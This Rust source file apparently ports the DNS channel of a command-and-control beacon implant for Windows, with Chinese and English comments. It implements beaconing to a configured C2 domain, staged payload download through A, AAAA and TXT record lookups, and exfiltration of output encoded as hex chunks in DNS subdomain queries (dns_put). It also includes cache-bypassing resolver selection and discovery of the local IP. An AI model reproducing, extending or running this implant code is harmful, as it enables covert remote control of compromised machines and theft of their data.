//! DNS + TCP 信道辅助函数（channel_tcp.cpp）。
//! DNS + TCP channel helpers (channel_tcp.cpp).

use crate::beacon::{
    SETTING_DNSRESOLVER, SETTING_DNS_BEACON_GET_A, SETTING_DNS_BEACON_GET_AAAA,
    SETTING_DNS_BEACON_GET_TXT, SETTING_DNS_IDLE, SETTING_DNS_SLEEP, SETTING_MAXDNS,
};
use crate::settings::{setting_int, setting_ptr, setting_short};
use base64::Engine;
use parking_lot::Mutex;
use std::sync::atomic::{AtomicBool, AtomicU32, Ordering};
use windows_sys::Win32::NetworkManagement::Dns::*;
use windows_sys::Win32::Networking::WinSock::*;

// SIO_GET_INTERFACE_LIST（_WSAIOR(IOC_IN, 7)）——windows-sys 未导出。
// SIO_GET_INTERFACE_LIST (_WSAIOR(IOC_IN, 7)) — not exported by windows-sys.
pub const SIO_GET_INTERFACE_LIST: u32 = 0x4004_7407;

static IS_WINSOCK_INITIALIZED: AtomicBool = AtomicBool::new(false);
static MAXDNS: AtomicU32 = AtomicU32::new(255);

static DNSRESOLVER: Mutex<Vec<u8>> = Mutex::new(Vec::new());
static DNSBEACON_GETA: Mutex<Vec<u8>> = Mutex::new(Vec::new());
static DNSBEACON_GETAAAA: Mutex<Vec<u8>> = Mutex::new(Vec::new());
static DNSBEACON_GETTXT: Mutex<Vec<u8>> = Mutex::new(Vec::new());

fn dnssleep() -> u32 {
    setting_int(SETTING_DNS_SLEEP)
}
fn dnsidle() -> u32 {
    setting_int(SETTING_DNS_IDLE)
}

/// 初始化 Winsock（仅一次）。
/// Initialize Winsock (only once).
pub fn channel_winsock_init() {
    if IS_WINSOCK_INITIALIZED.load(Ordering::SeqCst) {
        return;
    }
    unsafe {
        let mut wsa_data = std::mem::zeroed::<WSADATA>();
        let version: u16 = 0x0202; // 版本 2.2，即 MAKEWORD(2,2) / Version 2.2, i.e. MAKEWORD(2,2)
        if WSAStartup(version, &mut wsa_data) != 0 {
            WSACleanup();
            panic!("ws2_32.dll is out of date");
        }
    }
    IS_WINSOCK_INITIALIZED.store(true, Ordering::SeqCst);

    *DNSRESOLVER.lock() = setting_ptr(SETTING_DNSRESOLVER).unwrap_or(b"").to_vec();
    *DNSBEACON_GETA.lock() = setting_ptr(SETTING_DNS_BEACON_GET_A).unwrap_or(b"").to_vec();
    *DNSBEACON_GETAAAA.lock() = setting_ptr(SETTING_DNS_BEACON_GET_AAAA).unwrap_or(b"").to_vec();
    *DNSBEACON_GETTXT.lock() = setting_ptr(SETTING_DNS_BEACON_GET_TXT).unwrap_or(b"").to_vec();
}

fn dns_sleep() {
    let s = dnssleep();
    if s > 0 {
        std::thread::sleep(std::time::Duration::from_millis(s as u64));
    }
}

pub fn set_max_dns(signal: u32) {
    let maxdns;
    if (signal & 0x2) == 0x2 {
        maxdns = setting_short(SETTING_MAXDNS);
    } else if (signal & 0x4) == 0x4 {
        maxdns = setting_short(SETTING_MAXDNS) / 2;
    } else {
        maxdns = setting_short(SETTING_MAXDNS) / 4;
    }
    // 将 maxdns 上限设为 253。
    // Cap maxdns at 253.
    let capped = if maxdns > 253 { 253 } else { maxdns };
    MAXDNS.store(capped as u32, Ordering::SeqCst);
}

fn maxdns() -> usize {
    MAXDNS.load(Ordering::SeqCst) as usize
}

fn nonce() -> u32 {
    use std::time::{SystemTime, UNIX_EPOCH};
    let seed = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_nanos() as u32)
        .unwrap_or(0);
    (seed | (seed.wrapping_mul(0x9E3779B9) >> 16)) as u32
}

/// 若配置了显式解析器，则通过它查询 DNS 记录。
/// Look up a DNS record via the explicit resolver if configured.
unsafe fn channel_lookup_explicit(
    dnsresolver: &[u8],
    domain: &[u8],
    w_type: u16,
    pp_dns_record: *mut *mut DNS_RECORDA,
) -> i32 {
    let domain_c = cstr(domain);
    if dnsresolver.is_empty() {
        return DnsQuery_A(
            domain_c.as_ptr() as *const _,
            w_type,
            0,
            std::ptr::null_mut(),
            pp_dns_record,
            std::ptr::null_mut(),
        ) as i32;
    }
    let resolver_c = cstr(dnsresolver);
    let mut srv_list: IP4_ARRAY = std::mem::zeroed();
    srv_list.AddrCount = 1;
    inet_pton(AF_INET as i32, resolver_c.as_ptr() as *const _, &mut srv_list.AddrArray[0] as *mut u32 as *mut _);
    DnsQuery_A(
        domain_c.as_ptr() as *const _,
        w_type,
        DNS_QUERY_BYPASS_CACHE,
        &mut srv_list as *mut IP4_ARRAY as *mut _,
        pp_dns_record,
        std::ptr::null_mut(),
    ) as i32
}

pub fn channel_lookup_retry(domain: &[u8], retry: i32) -> u32 {
    channel_winsock_init();
    dns_sleep();

    let resolver = DNSRESOLVER.lock().clone();
    for x in 0..retry {
        unsafe {
            let mut p_dns_record: *mut DNS_RECORDA = std::ptr::null_mut();
            let status = channel_lookup_explicit(&resolver, domain, DNS_TYPE_A, &mut p_dns_record);
            if status == 0 {
                let ip = (*p_dns_record).Data.A.IpAddress;
                DnsFree(p_dns_record as *const _, DnsFreeRecordList);
                return ip;
            }
        }
        std::thread::sleep(std::time::Duration::from_millis((x as u64) + 1000));
    }
    0
}

/// 我们用于通过 DNS 回连信标的函数。
/// Our function for beaconing over DNS.
pub fn channel_lookup(domain: &[u8], result: &mut u32) -> bool {
    channel_winsock_init();
    dns_sleep();

    let resolver = DNSRESOLVER.lock().clone();
    unsafe {
        let mut p_dns_record: *mut DNS_RECORDA = std::ptr::null_mut();
        let status = channel_lookup_explicit(&resolver, domain, DNS_TYPE_A, &mut p_dns_record);
        if status == 0 {
            *result = (*p_dns_record).Data.A.IpAddress;
            DnsFree(p_dns_record as *const _, DnsFreeRecordList);
            return true;
        }
    }
    false
}

/// 通过 DNS（A 记录）获取载荷。
/// Get payload via DNS (A records).
pub fn dns_get(domain: &[u8], buffer: &mut [u8], max: usize) -> usize {
    let mut size: usize = 0;
    let mut read: usize = 0;
    let reqno = 0u32;
    let n = nonce();

    let mut c2domain = String::new();
    {
        let geta = DNSBEACON_GETA.lock().clone();
        c2domain = format!(
            "{}{:x}{:x}.{}",
            String::from_utf8_lossy(&geta),
            reqno,
            n,
            String::from_utf8_lossy(domain)
        );
    }
    size = (channel_lookup_retry(c2domain.as_bytes(), 100).to_be() ^ dnsidle()) as usize;

    if size == 0 || size > max {
        return 0;
    }

    let mut reqno = 1u32;
    while read < size {
        let geta = DNSBEACON_GETA.lock().clone();
        c2domain = format!(
            "{}{:x}{:x}.{}",
            String::from_utf8_lossy(&geta),
            reqno,
            n,
            String::from_utf8_lossy(domain)
        );
        let data = channel_lookup_retry(c2domain.as_bytes(), 100);
        let bytes = data.to_le_bytes();
        let n = (size - read).min(4);
        buffer[read..read + n].copy_from_slice(&bytes[..n]);
        read += n;
        reqno += 1;
    }
    size
}

/// 通过 DNS（AAAA 记录）获取载荷。
/// Get payload via DNS (AAAA records).
pub fn dns_get6(domain: &[u8], buffer: &mut [u8], max: usize) -> usize {
    let mut size: usize = 0;
    let mut read: usize = 0;
    let n = nonce();

    let mut c2domain = String::new();
    {
        let getaaaa = DNSBEACON_GETAAAA.lock().clone();
        c2domain = format!(
            "{}{:x}{:x}.{}",
            String::from_utf8_lossy(&getaaaa),
            0u32,
            n,
            String::from_utf8_lossy(domain)
        );
    }
    size = (channel_lookup_retry(c2domain.as_bytes(), 100).to_be() ^ dnsidle()) as usize;

    if size == 0 || size > max {
        return 0;
    }

    let mut reqno = 1u32;
    while read < size {
        let getaaaa = DNSBEACON_GETAAAA.lock().clone();
        c2domain = format!(
            "{}{:x}{:x}.{}",
            String::from_utf8_lossy(&getaaaa),
            reqno,
            n,
            String::from_utf8_lossy(domain)
        );
        let mut data = [0u8; 16];
        let _ = channel_lookup_retry6(c2domain.as_bytes(), 100, &mut data);
        let n = (size - read).min(16);
        buffer[read..read + n].copy_from_slice(&data[..n]);
        read += n;
        reqno += 1;
    }
    size
}

/// 通过 DNS 发送输出。
/// Put output via DNS.
pub fn dns_put(rtype: &[u8], domain: &[u8], buffer: &[u8], length: usize) {
    let mut sent = 0usize;
    let n = nonce();
    let mut reqno = 0u32;

    let mut c2domain = format!(
        "{}1{:x}.{:x}{:x}.{}",
        String::from_utf8_lossy(rtype),
        length,
        reqno,
        n,
        String::from_utf8_lossy(domain)
    );
    channel_lookup_retry(c2domain.as_bytes(), 100);
    reqno += 1;

    while sent < length {
        let mut maybe = 0usize;
        let mut dataz = [0u32; 26];

        // 发送 104 字节 = 26 个单次请求。
        // Send 104 bytes = 26 single requests.
        if (sent + 104) <= length {
            for i in 0..26 {
                let off = sent + i * 4;
                // C++ 中的 htonl(dataz[i])——对原始字节做 BE 读取，与对按小端解释的值应用 htonl() 逐字节相同。
                // htonl(dataz[i]) in the C++ — a BE read of the raw bytes is
                // byte-identical to htonl() applied to the LE-interpreted value.
                dataz[i] = u32::from_be_bytes([
                    buffer[off],
                    buffer[off + 1],
                    buffer[off + 2],
                    buffer[off + 3],
                ]);
            }
            c2domain = format!(
                "{}4{:08x}{:08x}{:08x}{:08x}{:08x}.{:08x}{:08x}{:08x}{:08x}{:08x}{:08x}{:08x}.{:08x}{:08x}{:08x}{:08x}{:08x}{:08x}{:08x}.{:08x}{:08x}{:08x}{:08x}{:08x}{:08x}{:08x}.{:x}{:x}.{}",
                String::from_utf8_lossy(rtype),
                dataz[0], dataz[1], dataz[2], dataz[3], dataz[4],
                dataz[5], dataz[6], dataz[7], dataz[8], dataz[9], dataz[10], dataz[11],
                dataz[12], dataz[13], dataz[14], dataz[15], dataz[16], dataz[17], dataz[18],
                dataz[19], dataz[20], dataz[21], dataz[22], dataz[23], dataz[24], dataz[25],
                reqno, n,
                String::from_utf8_lossy(domain)
            );
            maybe = 104;
        }

        // 发送 84 字节 = 21 个单次请求。
        // Send 84 bytes = 21 single requests.
        if (maybe == 0 || c2domain.len() >= maxdns()) && (sent + 84) <= length {
            for i in 0..21 {
                let off = sent + i * 4;
                dataz[i] = u32::from_be_bytes([buffer[off], buffer[off + 1], buffer[off + 2], buffer[off + 3]]);
            }
            c2domain = format!(
                "{}3{:08x}{:08x}{:08x}{:08x}{:08x}{:08x}{:08x}.{:08x}{:08x}{:08x}{:08x}{:08x}{:08x}{:08x}.{:08x}{:08x}{:08x}{:08x}{:08x}{:08x}{:08x}.{:x}{:x}.{}",
                String::from_utf8_lossy(rtype),
                dataz[0], dataz[1], dataz[2], dataz[3], dataz[4], dataz[5], dataz[6],
                dataz[7], dataz[8], dataz[9], dataz[10], dataz[11], dataz[12], dataz[13],
                dataz[14], dataz[15], dataz[16], dataz[17], dataz[18], dataz[19], dataz[20],
                reqno, n,
                String::from_utf8_lossy(domain)
            );
            maybe = 84;
        }

        // 发送 56 字节 = 14 个单次请求。
        // Send 56 bytes = 14 single requests.
        if (maybe == 0 || c2domain.len() >= maxdns()) && (sent + 56) <= length {
            for i in 0..14 {
                let off = sent + i * 4;
                dataz[i] = u32::from_be_bytes([buffer[off], buffer[off + 1], buffer[off + 2], buffer[off + 3]]);
            }
            c2domain = format!(
                "{}2{:08x}{:08x}{:08x}{:08x}{:08x}{:08x}{:08x}.{:08x}{:08x}{:08x}{:08x}{:08x}{:08x}{:08x}.{:x}{:x}.{}",
                String::from_utf8_lossy(rtype),
                dataz[0], dataz[1], dataz[2], dataz[3], dataz[4], dataz[5], dataz[6],
                dataz[7], dataz[8], dataz[9], dataz[10], dataz[11], dataz[12], dataz[13],
                reqno, n,
                String::from_utf8_lossy(domain)
            );
            maybe = 56;
        }

        // 发送 48 字节 = 12 个单次请求。
        // Send 48 bytes = 12 single requests.
        if (maybe == 0 || c2domain.len() >= maxdns()) && (sent + 48) <= length {
            for i in 0..12 {
                let off = sent + i * 4;
                dataz[i] = u32::from_be_bytes([buffer[off], buffer[off + 1], buffer[off + 2], buffer[off + 3]]);
            }
            c2domain = format!(
                "{}2{:08x}{:08x}{:08x}{:08x}{:08x}{:08x}.{:08x}{:08x}{:08x}{:08x}{:08x}{:08x}.{:x}{:x}.{}",
                String::from_utf8_lossy(rtype),
                dataz[0], dataz[1], dataz[2], dataz[3], dataz[4], dataz[5],
                dataz[6], dataz[7], dataz[8], dataz[9], dataz[10], dataz[11],
                reqno, n,
                String::from_utf8_lossy(domain)
            );
            maybe = 48;
        }

        // 发送 40 字节 = 10 个单次请求。
        // Send 40 bytes = 10 single requests.
        if (maybe == 0 || c2domain.len() >= maxdns()) && (sent + 40) <= length {
            for i in 0..10 {
                let off = sent + i * 4;
                dataz[i] = u32::from_be_bytes([buffer[off], buffer[off + 1], buffer[off + 2], buffer[off + 3]]);
            }
            c2domain = format!(
                "{}2{:08x}{:08x}{:08x}{:08x}{:08x}.{:08x}{:08x}{:08x}{:08x}{:08x}.{:x}{:x}.{}",
                String::from_utf8_lossy(rtype),
                dataz[0], dataz[1], dataz[2], dataz[3], dataz[4],
                dataz[5], dataz[6], dataz[7], dataz[8], dataz[9],
                reqno, n,
                String::from_utf8_lossy(domain)
            );
            maybe = 40;
        }

        // 发送 28 字节 = 7 个单次请求。
        // Send 28 bytes = 7 single requests.
        if (maybe == 0 || c2domain.len() >= maxdns()) && (sent + 28) <= length {
            for i in 0..7 {
                let off = sent + i * 4;
                dataz[i] = u32::from_be_bytes([buffer[off], buffer[off + 1], buffer[off + 2], buffer[off + 3]]);
            }
            c2domain = format!(
                "{}1{:08x}{:08x}{:08x}{:08x}{:08x}{:08x}{:08x}.{:x}{:x}.{}",
                String::from_utf8_lossy(rtype),
                dataz[0], dataz[1], dataz[2], dataz[3], dataz[4], dataz[5], dataz[6],
                reqno, n,
                String::from_utf8_lossy(domain)
            );
            maybe = 28;
        }

        // 发送 24 字节 = 6 个单次请求。
        // Send 24 bytes = 6 single requests.
        if (maybe == 0 || c2domain.len() >= maxdns()) && (sent + 24) <= length {
            for i in 0..6 {
                let off = sent + i * 4;
                dataz[i] = u32::from_be_bytes([buffer[off], buffer[off + 1], buffer[off + 2], buffer[off + 3]]);
            }
            c2domain = format!(
                "{}1{:08x}{:08x}{:08x}{:08x}{:08x}{:08x}.{:x}{:x}.{}",
                String::from_utf8_lossy(rtype),
                dataz[0], dataz[1], dataz[2], dataz[3], dataz[4], dataz[5],
                reqno, n,
                String::from_utf8_lossy(domain)
            );
            maybe = 24;
        }

        // 发送 20 字节 = 5 个单次请求。
        // Send 20 bytes = 5 single requests.
        if (maybe == 0 || c2domain.len() >= maxdns()) && (sent + 20) <= length {
            for i in 0..5 {
                let off = sent + i * 4;
                dataz[i] = u32::from_be_bytes([buffer[off], buffer[off + 1], buffer[off + 2], buffer[off + 3]]);
            }
            c2domain = format!(
                "{}1{:08x}{:08x}{:08x}{:08x}{:08x}.{:x}{:x}.{}",
                String::from_utf8_lossy(rtype),
                dataz[0], dataz[1], dataz[2], dataz[3], dataz[4],
                reqno, n,
                String::from_utf8_lossy(domain)
            );
            maybe = 20;
        }

        // 发送 16 字节 = 4 个单次请求。
        // Send 16 bytes = 4 single requests.
        if (maybe == 0 || c2domain.len() >= maxdns()) && (sent + 16) <= length {
            for i in 0..4 {
                let off = sent + i * 4;
                dataz[i] = u32::from_be_bytes([buffer[off], buffer[off + 1], buffer[off + 2], buffer[off + 3]]);
            }
            c2domain = format!(
                "{}1{:08x}{:08x}{:08x}{:08x}.{:x}{:x}.{}",
                String::from_utf8_lossy(rtype),
                dataz[0], dataz[1], dataz[2], dataz[3],
                reqno, n,
                String::from_utf8_lossy(domain)
            );
            maybe = 16;
        }

        // 发送 12 字节 = 3 个单次请求。
        // Send 12 bytes = 3 single requests.
        if (maybe == 0 || c2domain.len() >= maxdns()) && (sent + 12) <= length {
            for i in 0..3 {
                let off = sent + i * 4;
                dataz[i] = u32::from_be_bytes([buffer[off], buffer[off + 1], buffer[off + 2], buffer[off + 3]]);
            }
            c2domain = format!(
                "{}1{:08x}{:08x}{:08x}.{:x}{:x}.{}",
                String::from_utf8_lossy(rtype),
                dataz[0], dataz[1], dataz[2],
                reqno, n,
                String::from_utf8_lossy(domain)
            );
            maybe = 12;
        }

        // 发送 8 字节 = 2 个单次请求。
        // Send 8 bytes = 2 single requests.
        if (maybe == 0 || c2domain.len() >= maxdns()) && (sent + 8) <= length {
            let off = sent;
            c2domain = format!(
                "{}1{:08x}{:08x}.{:x}{:x}.{}",
                String::from_utf8_lossy(rtype),
                u32::from_be_bytes([buffer[off], buffer[off + 1], buffer[off + 2], buffer[off + 3]]),
                u32::from_be_bytes([buffer[off + 4], buffer[off + 5], buffer[off + 6], buffer[off + 7]]),
                reqno, n,
                String::from_utf8_lossy(domain)
            );
            maybe = 8;
        }

        // 发送 4 字节 = 1 个单次请求。
        // Send 4 bytes = 1 single request.
        if maybe == 0 || c2domain.len() >= maxdns() {
            let off = sent;
            let data = u32::from_be_bytes([buffer[off], buffer[off + 1], buffer[off + 2], buffer[off + 3]]);
            c2domain = format!(
                "{}1{:08x}.{:x}{:x}.{}",
                String::from_utf8_lossy(rtype),
                data,
                reqno, n,
                String::from_utf8_lossy(domain)
            );
            maybe = 4;
        }

        sent += maybe;
        channel_lookup_retry(c2domain.as_bytes(), 100);
        reqno += 1;
    }
}

/// 通过 DNS（TXT 记录）获取载荷。
/// Get payload via DNS (TXT records).
pub fn dns_get_txt(domain: &[u8], buffer: &mut [u8], max: usize) -> i32 {
    let n = nonce();
    let mut reqno = 0u32;

    let mut c2domain = String::new();
    {
        let gettxt = DNSBEACON_GETTXT.lock().clone();
        c2domain = format!(
            "{}{:x}{:x}.{}",
            String::from_utf8_lossy(&gettxt),
            reqno,
            n,
            String::from_utf8_lossy(domain)
        );
    }
    let total = (channel_lookup_retry(c2domain.as_bytes(), 100).to_be() ^ dnsidle()) as usize;
    reqno += 1;

    if total == 0 || total > max {
        return 0;
    }

    let mut size = 0usize;
    while size < total {
        let gettxt = DNSBEACON_GETTXT.lock().clone();
        c2domain = format!(
            "{}{:x}{:x}.{}",
            String::from_utf8_lossy(&gettxt),
            reqno,
            n,
            String::from_utf8_lossy(domain)
        );
        let mut encoded = [0u8; 1024];
        let read = channel_lookup_retry_txt(c2domain.as_bytes(), 100, &mut encoded, 1024);
        if read <= 0 {
            return -1;
        }

        // 对返回的数据进行 base64 解码。
        // Base64 decode the returned data.
        let engine = base64::engine::general_purpose::STANDARD;
        let mut decoded = [0u8; 1024];
        match engine.decode(&encoded[..read as usize]) {
            Ok(d) => {
                let dlen = d.len();
                if (size + dlen) < max {
                    buffer[size..size + dlen].copy_from_slice(&d);
                    size += dlen;
                } else {
                    return -1;
                }
            }
            Err(_) => return -1,
        }
        reqno += 1;
    }
    size as i32
}

fn channel_lookup_retry_txt(domain: &[u8], retry: i32, buffer: &mut [u8], max: usize) -> i32 {
    dns_sleep();
    let resolver = DNSRESOLVER.lock().clone();

    for x in 0..retry {
        unsafe {
            let mut p_dns_record: *mut DNS_RECORDA = std::ptr::null_mut();
            let status = channel_lookup_explicit(&resolver, domain, DNS_TYPE_TEXT, &mut p_dns_record);
            if status == 0 {
                let mut t = 0usize;
                let dw_count = (*p_dns_record).Data.TXT.dwStringCount;
                for y in 0..dw_count {
                    let s = (*p_dns_record).Data.TXT.pStringArray[y as usize];
                    let l = strlen_cstr(s as *const u8);
                    if (t + l) < max {
                        buffer[t..t + l].copy_from_slice(std::slice::from_raw_parts(s as *const u8, l));
                    } else {
                        return -2;
                    }
                    t += l;
                }
                DnsFree(p_dns_record as *const _, DnsFreeRecordList);
                return t as i32;
            }
        }
        std::thread::sleep(std::time::Duration::from_millis((x as u64) + 1000));
    }
    -1
}

fn channel_lookup_retry6(domain: &[u8], retry: i32, buffer: &mut [u8]) -> i32 {
    dns_sleep();
    let resolver = DNSRESOLVER.lock().clone();

    for x in 0..retry {
        unsafe {
            let mut p_dns_record: *mut DNS_RECORDA = std::ptr::null_mut();
            let status = channel_lookup_explicit(&resolver, domain, DNS_TYPE_AAAA, &mut p_dns_record);
            if status == 0 {
                buffer[..16].copy_from_slice(&(*p_dns_record).Data.AAAA.Ip6Address.IP6Byte);
                DnsFree(p_dns_record as *const _, DnsFreeRecordList);
                return 16;
            }
        }
        std::thread::sleep(std::time::Duration::from_millis((x as u64) + 1000));
    }
    -1
}

/// 获取本机（非回环）IP 地址。
/// Get our local (non-loopback) IP address.
pub fn channel_localip() -> u32 {
    channel_winsock_init();
    unsafe {
        let sd = WSASocketA(AF_INET as i32, SOCK_DGRAM as i32, 0, std::ptr::null(), 0, 0);
        if sd == INVALID_SOCKET {
            return 0;
        }
        let mut interface_list = [std::mem::zeroed::<INTERFACE_INFO>(); 20];
        let mut n_bytes_returned: u32 = 0;
        let mut ret_val: u32 = 0;
        let n_interfaces = if WSAIoctl(
            sd,
            SIO_GET_INTERFACE_LIST,
            std::ptr::null_mut(),
            0,
            interface_list.as_mut_ptr() as *mut _,
            std::mem::size_of::<[INTERFACE_INFO; 20]>() as u32,
            &mut n_bytes_returned,
            std::ptr::null_mut(),
            None,
        ) == 0
        {
            (n_bytes_returned / std::mem::size_of::<INTERFACE_INFO>() as u32) as usize
        } else {
            0
        };

        for i in 0..n_interfaces {
            let addr: SOCKADDR_IN = std::ptr::read_unaligned(&interface_list[i].iiAddress as *const _ as *const SOCKADDR_IN);
            let flags = interface_list[i].iiFlags;
            if !(flags & IFF_LOOPBACK != 0) && (flags & IFF_UP != 0) {
                ret_val = addr.sin_addr.S_un.S_addr;
                break;
            }
        }
        closesocket(sd);
        ret_val
    }
}

fn strlen_cstr(mut p: *const u8) -> usize {
    let mut len = 0;
    unsafe {
        while *p != 0 {
            len += 1;
            p = p.add(1);
        }
    }
    len
}

fn cstr(s: &[u8]) -> Vec<u8> {
    let mut v = s.to_vec();
    if !v.ends_with(&[0]) {
        v.push(0);
    }
    v
}
